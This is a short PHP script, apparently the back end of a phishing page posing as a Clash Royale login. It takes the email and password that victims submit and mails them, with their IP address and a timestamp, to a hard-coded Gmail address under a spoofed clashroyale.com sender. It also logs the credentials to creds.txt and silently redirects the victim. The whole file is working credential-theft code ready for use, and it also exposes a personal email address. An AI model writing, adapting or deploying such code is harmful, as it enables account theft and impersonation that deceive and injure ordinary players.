<?php
// ✅ TON EMAIL DÉJÀ CONFIGURÉ
$dest_email = "pardogabinemail@gmail.com";

$email_user = $_POST['email'] ?? '';
$pass_user = $_POST['password'] ?? '';

if($email_user && $pass_user) {
    
    $sujet = "🚨 CLASH ROYALE - NOUVELLES CREDENTIALS";
    
    $message = "
╔══════════════════════════════════════╗
║           CLASH ROYALE PHISH          ║
╠══════════════════════════════════════╣
║ 📧 EMAIL:          $email_user        ║
║ 🔑 MOT DE PASSE:   $pass_user         ║
║ 🌐 IP:             {$_SERVER['REMOTE_ADDR']} ║
║ 🕐 DATE:           " . date('d/m/Y H:i:s') . " ║
╚══════════════════════════════════════╝
    ";
    
    $headers = "From: Clash Royale <no-reply@clashroyale.com>\r\n";
    $headers .= "Reply-To: no-reply@clashroyale.com\r\n";
    $headers .= "X-Mailer: PHP/" . phpversion();
    
    // ✅ ENVOI DIRECT À pardogabinemail@gmail.com
    mail($dest_email, $sujet, $message, $headers);
    
    // 💾 BACKUP FICHIER (ouvre creds.txt pour voir)
    $log = date('Y-m-d H:i:s') . " | $email_user | $pass_user | {$_SERVER['REMOTE_ADDR']}\n";
    file_put_contents('creds.txt', $log, FILE_APPEND | LOCK_EX);
}

// 🔄 Retour silencieux
header('Location: index.html?success=1');
exit;
?>
